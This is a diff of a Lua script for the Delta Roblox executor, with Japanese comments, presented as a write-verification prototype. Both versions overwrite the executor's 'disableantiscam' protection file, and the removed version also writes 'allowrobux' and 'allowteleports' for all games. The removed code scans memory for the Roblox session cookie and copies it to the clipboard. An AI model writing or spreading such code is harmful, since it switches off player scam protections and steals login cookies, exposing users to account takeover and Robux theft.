@@ -1,58 +1,63 @@
--- "" Delta Universal Hybrid Sync (API-Based) ""
+-- "" Delta Secured Writefile 検証プロトタイプ ""
 
 local function log(msg)
-    print("[PROJECT-LOG] " .. tostring(msg))
+    print("[WRITE-TEST] " .. tostring(msg))
 end
 
-local function get_real_id()
-    -- ファイルを読まずに、現在ログイン中のプレイヤーから直接IDを取る
-    -- これが一番確実で「誰にでも」適用できる
-    local player = game:GetService("Players").LocalPlayer
-    if player then
-        return tostring(player.UserId)
+local function verify_and_write()
+    log("--- 検証開始 ---")
+
+    local path = "Delta/Internals/Secured/disableantiscam"
+    local real_id = tostring(game:GetService("Players").LocalPlayer.UserId) -- APIから直接取得
+    
+    log("ターゲットID: " .. real_id)
+
+    -- 1. 現在のファイル状態を確認
+    if isfile(path) then
+        log("現状: ファイル存在確認。サイズ: " .. #readfile(path) .. " bytes")
+    else
+        log("警告: ファイルが見当たらない。新規作成を試みる。")
     end
-    return nil
-end
 
-local function execute_universal_patch()
-    log("--- 外部参照型・作戦開始 ---")
+    -- 2. ペイロードの構築 (画像にあった最新形式を完全再現)
+    local payload = {
+        ["WARNING"] = "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!",
+        ["allowed_games"] = "*",
+        ["user_id"] = real_id, -- ここが文字列であることを再三確認
+        ["version_num"] = 707
+    }
 
-    local real_id = get_real_id()
-    if not real_id then
-        log("ERROR: プレイヤーIDが取得できない。ログインしてるか？")
+    local success_encode, json_data = pcall(function()
+        return game:GetService("HttpService"):JSONEncode(payload)
+    end)
+
+    if not success_encode then
+        log("ERROR: JSONエンコードに失敗したぜ。")
         return
     end
-    log("SUCCESS: 現在のUserIDを特定 -> [" .. real_id .. "]")
 
-    -- 同期対象ファイル
-    local secured_dir = "Delta/Internals/Secured/"
-    local targets = {"disableantiscam", "allowrobux", "allowteleports"}
+    -- 3. 書き込み実行 & 結果検証
+    log("実行: writefile を叩く...")
+    local success_write, err_write = pcall(function()
+        writefile(path, json_data)
+    end)
 
-    for _, target in pairs(targets) do
-        local payload = {
-            ["WARNING"] = "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE...",
-            ["allowed_games"] = "*",
-            ["user_id"] = real_id,
-            ["version_num"] = 707
-        }
-
-        local success, err = pcall(function()
-            writefile(secured_dir .. target, game:GetService("HttpService"):JSONEncode(payload))
-        end)
+    if success_write then
+        log("SUCCESS: writefile 関数自体は正常終了。")
         
-        log(success and ("PATCHED: " .. target) or ("FAILED: " .. target .. " - " .. tostring(err)))
+        -- 即座に読み直して、本当に書き換わったか確認
+        local after_content = readfile(path)
+        if after_content == json_data then
+            log("SUCCESS: 読み取り整合性チェック完了。中身は完全に一致。")
+        else
+            log("FAILED: 書き込みは成功したが、中身が古いままか、勝手にリセットされた。")
+            log("現在の中身: " .. tostring(after_content))
+        end
+    else
+        log("ERROR: writefile が拒絶された。理由: " .. tostring(err_write))
     end
 
-    -- クッキー取得トラップ（例のサイトがやってるようなロジックの逆を行く）
-    log("ステップ3: メモリ内クッキーの最終蒸留...")
-    for _, v in pairs(getgc(true)) do
-        if type(v) == "string" and string.find(v, "_|WARNING:-DO-NOT-SHARE-") then
-            setclipboard(v)
-            log("MISSION COMPLETE: クッキーをクリップボードに奪取したぜ。")
-            return
-        end
-    end
-    log("FAILED: メモリにまだ浮いてない。通信を待つ。")
+    log("--- 検証終了 ---")
 end
 
-execute_universal_patch()
+verify_and_write()
